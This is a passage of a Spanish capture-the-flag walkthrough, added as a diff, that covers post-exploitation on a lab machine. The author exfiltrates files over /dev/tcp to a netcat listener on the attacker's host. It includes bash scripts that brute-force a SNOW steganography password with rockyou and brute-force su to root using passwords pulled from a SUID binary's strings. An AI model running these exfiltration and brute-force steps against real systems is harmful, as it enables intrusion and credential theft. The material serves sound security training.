@@ -217,5 +217,255 @@ cat /usr/include/musica/.stego
 Descarga el fichero como insinua la web y realiza fuerza bruta para hallar el password que esconde la contraseña del usuario.
 Ten en cuenta que la salida del comando "snow" siempre devuelve datos y ha sido escondida  con el siguinete formato password:XXXXXXXXXX
 ```
+y veo un archivo mp3 que probablemente usando snow pueda romper y ver la data que esconde
+```bash
+ls -la /usr/include/musica/
+```
+```
+total 2868
+drwxr-xr-x 1 root     root        4096 May 11 09:17 .
+drwxr-xr-x 1 root     root        4096 May  3 06:08 ..
+-rw-rw---- 1 www-data www-data     265 May 11 09:17 .stego
+-rw-r--r-- 1 www-data www-data 2918537 May  4 06:19 elperro.mp3
+-r-------- 1 www-data root         917 May  9 01:20 miletra.txt
+```
 
+no puedo utilizar ni scp, ni nc, ni python ni, ni wget, ni curl...pero con la medio pista del ping, he recordado que en las trazas ICMP pero como hay que trocear el archivo y hacer mil cosas antes pruebo lo siguiente:
+
+en la máquina victima me pongo en escucha para recibir un archivo:
+```bash
+ nc -lvnp 1337 > elperro.mp3
+```
+y en la maquina victima mediante /dev/tcp intento enviarmelo:
+```bash
+cat elperro.mp3 > /dev/tcp/172.17.0.1/1337
+```
+hacemos lo mismo para el archivo miletra.txt
+```bash
+nc -lvnp 1337 > miletra.txt
+```
+```bash
+cat miletra.txt > /dev/tcp/172.17.0.1/1337
+```
+y parece que funciona, ahora tenemos que correr snow y hacer fuerzabruta
+descargo snow de esta página:
+```bash
+https://darkside.com.au/snow/
+```
+descomprimo
+```bash
+ tar -xvzf snow-20130616.tar.gz
+```
+entro en la carpeta:
+```bash
+cd snow-20130616
+```
+hago un make para compilar
+```bash
+make
+```
+me da este error:
+```
+cc -O   -c -o main.o main.c
+main.c: In function ‘main’:
+main.c:180:17: error: implicit declaration of function ‘strcmp’ [-Wimplicit-function-declaration]
+  180 |             if (strcmp (argv[optind], "--help") == 0) {
+      |                 ^~~~~~
+main.c:40:1: note: include ‘<string.h>’ or provide a declaration of ‘strcmp’
+   39 | #include "snow.h"
+  +++ |+#include <string.h>
+   40 | 
+make: *** [<integrado>: main.o] Error 1
+
+```
+hacemos un nano a main.c
+```bash
+nano main.c
+```
+buscamos la linea :
+```
+#include "snow.h"
+```
+y debajo ponemos:
+```bash
+#include <string.h>
+```
+y ahora cuando hacemos el make ya funciona
+
+en teoría snow funciona así:
+```
+./snow -p password  archivo
+```
+hago un script para miletra.txt (probe con el mp3 y no encontre nada :
+
+```bash
+#!/bin/bash
+#ruta diccionario
+wordlist="/usr/share/wordlists/rockyou.txt"
+#ruta del archivo
+target_file="/home/kali/Desktop/vulnix/thedog/trabajo/codificado/snow-20130616/miletra.txt"
+total_lines=$(wc -l < "$wordlist")
+count=0
+
+while read -r passwd; do
+    ((count++))
+    progress=$(( 100 * count / total_lines ))
+
+    # Barra de progreso (20 caracteres)
+    filled=$(( progress / 5 ))
+    empty=$(( 20 - filled ))
+    bar=$(printf "%0.s#" $(seq 1 $filled))
+    bar+=$(printf "%0.s-" $(seq 1 $empty))
+
+    # Mostrar barra + pass en la misma línea
+    echo -ne "\r[${bar}] ${progress}% Probando: ${passwd}    "
+
+    # Ejecutar snow con la contraseña
+    output=$(./snow -C -Q -p "$passwd" "$target_file" 2>/dev/null)
+
+    # Verificar si la salida contiene 'password:'
+    if [[ -n "$output" && "$output" == *"password:"* ]]; then
+        echo -e "\n✅ Contraseña encontrada: $passwd"
+        echo "🔐 Mensaje oculto:"
+        echo "$output"
+        exit 0
+    fi
+
+done < "$wordlist"
+
+echo -e "\n❌ No se encontró la contraseña en el diccionario."
+```
+```bash
+ ./fuerzabruta.sh                                                                                                                                       ░▒▓ ✔ │ 14s   
+```
+```
+[#--------------------] 0% Probando: superman      
+✅ Contraseña encontrada: superman
+🔐 Mensaje oculto:
+password:secret
+```
+pruebo a convertirme en el usuario punky con la contraseña secret:
+```bash
+su punky
+```
+```bash
+id
+```
+```
+uid=1001(punky) gid=1001(punky) groups=1001(punky),100(users),1002(suidgroup)
+```
+veo que pertenezco al grupo suidgroup, voy a buscar archvos del grupo:
+```bash
+find / -group suidgroup 2>/dev/null
+```
+```
+/usr/local/bin/task_manager
+```
+```bash
+ls -la /usr/local/bin/task_manager
+```
+```
+-rwsr-x--- 1 root suidgroup 16712 May 11 08:55 /usr/local/bin/task_manager
+```
+lo ejecuto y despues de no saber que leches hace pruebo a leer el help:
+````bash
+/usr/local/bin/task_manager -h
+```
+```
+Uso: /usr/local/bin/task_manager -d <detalles_de_tarea> [-c <archivo_config>] [-o <archivo_log>]
+Opciones:
+  -d DETALLES   Descripción de la tarea a ejecutar/registrar. ¡Este es el importante!
+  -c CONFIG     Ruta al archivo de configuración de la tarea (opcional).
+  -o OUTPUT_LOG Ruta al archivo donde se registrará la salida (opcional).
+  -h            Muestra esta ayuda.
+
+PISTA: Los detalles a veces pueden ser... más que simples palabras.
+```
+intento inyectar mil cosas sobre todo mirando la salida de los logs de /tmp y nada, al tratarse de un binario
+antes de nada pruebo a hacer un strings:
+```bash
+strings /usr/local/bin/task_manager
+```
+en la salida veo algo interesante:
+```
+password
+123456
+qwerty
+admin
+guest
+root
+user
+hannah
+default
+1234
+0000
+1111
+9876
+asdfgh
+zxcvbn
+qwertz
+aaaaaa
+bbbbbb
+111111
+```
+parecen contraseñas
+ creo un dicionario con las contraseñas y lo llamo diccionario.txt y hago un script para probarlas intentando hacerme usuario root:
+```bash
+#!/bin/bash
+
+# Archivo con lista de contraseñas (una por línea)
+WORDLIST="diccionario.txt"
+
+# Usuario al que intentar acceder
+USER="root"
+
+# Archivo para guardar contraseñas probadas
+LOGFILE="su_bruteforce.log"
+
+# Intentar cada password
+while IFS= read -r password; do
+    echo "Probando contraseña: $password"
+
+    # Intentar hacer su con password (timeout 5s para no colgar)
+    echo "$password" | timeout 5 su -c "id" $USER 2>/dev/null >/dev/null
+
+    # Revisar código de salida (0 = éxito)
+    if [ $? -eq 0 ]; then
+        echo "Contraseña encontrada: $password"
+        echo "$password" > success_password.txt
+        exit 0
+    fi
+
+done < "$WORDLIST"
+
+echo "No se encontró la contraseña en el diccionario."
+exit 1
+```
+le doy permisos de ejecución y lo prubo:
+```bash
+chmod +x fuerzabruta.sh 
+./fuerzabruta.sh 
+```
+```
+Probando contraseña: password
+Probando contraseña: 123456
+Probando contraseña: qwerty
+Probando contraseña: admin
+Probando contraseña: guest
+Probando contraseña: root
+Probando contraseña: user
+Probando contraseña: hannah
+Contraseña encontrada: hannah
+```
+parece que la contraseña hannah es la de root, probamos:
+```bash
+su root
+```
+```
+punky@f212345cfd62:/tmp$ su root
+Password: 
+root@f212345cfd62:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@f212345cfd62:/tmp# 
+```
 
